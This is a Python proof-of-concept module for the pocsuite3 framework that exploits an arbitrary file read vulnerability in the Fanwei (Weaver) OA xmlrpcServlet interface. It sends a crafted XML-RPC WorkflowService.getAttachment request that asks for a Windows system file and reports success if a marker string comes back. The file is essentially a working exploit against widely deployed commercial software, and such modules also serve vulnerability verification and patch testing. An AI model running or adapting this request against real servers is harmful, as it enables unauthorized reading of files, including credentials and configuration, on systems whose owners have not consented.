# _*_ coding:utf-8 _*_
# @Time : 2023/12/25
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str


class fanweiOA_xml_fileread(POCBase):
    pocDesc = '''泛微OA xmlrpcServlet接口任意文件读取漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-25'
    name = '泛微OA xmlrpcServlet接口任意文件读取漏洞'

    def _verify(self):

        result = {}
        url = self.url + '/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = """<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>WorkflowService.getAttachment</methodName><params><param><value><string>c://windows/win.ini</string></value></param></params></methodCall>"""


        try:

            response = requests.post(url, headers=headers,data=data,verify=False)
            text = response.text
            if response.status_code == 200 and 'Oy' in text:
                result['VerifyInfo'] = {}

            return self.parse_output(result)
        except Exception as e:
            pass


register_poc(fanweiOA_xml_fileread)